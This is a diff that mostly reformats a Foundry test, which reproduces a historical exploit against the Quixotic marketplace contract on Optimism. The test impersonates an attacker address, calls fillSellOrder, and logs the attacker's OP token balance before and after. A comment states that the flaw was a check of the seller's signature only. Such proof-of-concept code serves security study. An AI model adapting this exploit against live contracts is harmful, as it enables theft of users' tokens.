@@ -3,10 +3,9 @@ pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
 
-import {IERC20} from "OpenZeppelin/interfaces/IERC20.sol";
+import {IERC20} from "src/interfaces/IERC20.sol";
 
 interface Quixotic {
-
     function fillSellOrder(
         address seller,
         address contractAddress,
@@ -20,11 +19,9 @@ interface Quixotic {
         bytes memory signature,
         address buyer
     ) external payable;
-
 }
 
 contract ContractTest is Test {
-
     IERC20 op = IERC20(0x4200000000000000000000000000000000000042);
     Quixotic quixotic = Quixotic(0x065e8A87b8F11aED6fAcf9447aBe5E8C5D7502b6);
 
@@ -35,7 +32,8 @@ contract ContractTest is Test {
     function testExploit() public {
         vm.prank(0x0A0805082EA0fc8bfdCc6218a986efda6704eFE5);
         emit log_named_uint(
-            "Before exploiting, attacker OP Balance:", op.balanceOf(0x0A0805082EA0fc8bfdCc6218a986efda6704eFE5)
+            "Before exploiting, attacker OP Balance:",
+            op.balanceOf(0x0A0805082EA0fc8bfdCc6218a986efda6704eFE5)
         );
         quixotic.fillSellOrder(
             0x0A0805082EA0fc8bfdCc6218a986efda6704eFE5,
@@ -51,7 +49,8 @@ contract ContractTest is Test {
             0x4D9618239044A2aB2581f0Cc954D28873AFA4D7B
         );
         emit log_named_uint(
-            "After exploiting, attacker OP Balance:", op.balanceOf(0x0A0805082EA0fc8bfdCc6218a986efda6704eFE5)
+            "After exploiting, attacker OP Balance:",
+            op.balanceOf(0x0A0805082EA0fc8bfdCc6218a986efda6704eFE5)
         );
 
         //issues was only check seller signature
@@ -59,5 +58,4 @@ contract ContractTest is Test {
     }
 
     receive() external payable {}
-
 }
